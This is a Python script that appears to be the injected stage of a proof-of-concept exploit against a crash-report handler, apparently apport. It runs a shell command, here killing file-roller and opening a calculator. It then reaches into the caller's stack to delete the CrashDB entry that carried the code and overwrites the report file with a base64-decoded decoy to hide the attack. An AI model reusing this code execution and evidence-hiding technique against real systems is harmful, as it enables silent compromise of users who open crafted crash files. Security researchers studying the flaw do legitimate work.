import subprocess
import inspect
import base64
import os

# Run the payload
payload = "pkill -9 file-roller; gnome-calculator"
print("Running payload: %s" % payload)
subprocess.Popen(payload, shell=True)

# Clean up the crash file
# We need to get a reference to the UI object from the stack as eval()
# is called without direct access to globals.
ui = inspect.getouterframes(inspect.currentframe())[-2][0].f_locals["self"]
ui.report.pop("CrashDB", None)  # Remove CrashDB payload from the report

with open(ui.report_file, "wb") as f:
    decoy_data_b64 = ui.report.pop("MemoryDump", None)
    if decoy_data_b64:
        # Replace the payload with a decoy file
        decoy_data_b64 = "".join(decoy_data_b64.splitlines()[1:])
        f.write(base64.b64decode(decoy_data_b64))
        ui.report["ProcCmdline"] = '{} "{}"'.format(
            ui.report["ProcCmdline"],
            os.path.abspath(ui.report_file),
        )
        print("Replaced %s with a decoy file" % os.path.abspath(ui.report_file))
    else:
        # Write the updated file without the CrashDB entry.
        ui.report.write(f)
        print("Replaced %s with clean report" % ui.report_file)
